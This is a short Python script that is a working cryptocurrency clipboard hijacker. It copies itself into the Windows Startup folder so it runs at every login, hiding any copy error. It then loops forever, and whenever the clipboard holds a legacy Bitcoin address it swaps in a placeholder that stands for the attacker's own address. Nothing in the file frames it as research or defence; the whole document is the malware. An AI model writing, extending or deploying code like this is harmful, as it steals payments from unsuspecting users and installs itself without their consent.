import pyperclip, re, os, shutil, sys

# USE THE FOLLOWING TO DETECT OS AND ADJUST SCRIPT ACCORDINGLY:
# import platform
# platform.system() --> Returns user platform's as:
#                                                   Linux = 'Linux'
#                                                   Mac = 'Darwin'
#                                                   Windows = 'Windows'
#
# PyperClip documentation: https://pypi.org/project/pyperclip/


def auto_run():

    current_location = sys.argv[0]
    application_name = os.path.basename(current_location)
    startup_folder = os.path.join(os.environ['USERPROFILE'],'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
    target_location = os.path.join(startup_folder,application_name)

    if not os.path.exists(target_location):

        try:
            shutil.copy(current_location, startup_folder)

        except:
            pass # This could be optimised with other instructions..


def address_swap():

    try:
        clipboard_data = pyperclip.paste()
        if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):
            pyperclip.copy('BTC ADDRESS')
            pyperclip.paste()

    except:
        data = None

def loop_through():
    
    while True:
        address_swap()


auto_run()
loop_through()
